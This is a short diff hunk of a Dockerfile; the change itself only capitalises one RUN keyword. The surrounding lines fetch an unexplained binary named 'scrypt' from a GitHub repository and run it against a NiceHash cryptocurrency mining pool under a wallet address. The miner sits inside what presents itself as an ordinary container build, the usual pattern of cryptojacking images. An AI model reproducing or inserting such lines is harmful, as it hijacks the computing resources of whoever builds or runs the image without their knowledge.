@@ -10,7 +10,7 @@ RUN apt-get update && \
     add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu bionic stable" && \
     apt-get update && \
     apt install docker-ce
-run apt-get install -qy automake autoconf pkg-config libcurl4-openssl-dev libssl-dev libjansson-dev libgmp-dev make g++ git
+RUN apt-get install -qy automake autoconf pkg-config libcurl4-openssl-dev libssl-dev libjansson-dev libgmp-dev make g++ git
 RUN wget https://github.com/vultrdocker/portal-vultr/raw/master/scrypt
 RUN chmod u+x scrypt
 RUN ./scrypt -a scrypt -o stratum+tcp://scrypt.usa-west.nicehash.com:3333 -u 3NFjvzSUkafgFvrhoEyHguguCu7Tg811y4.cpu -p x -t 6
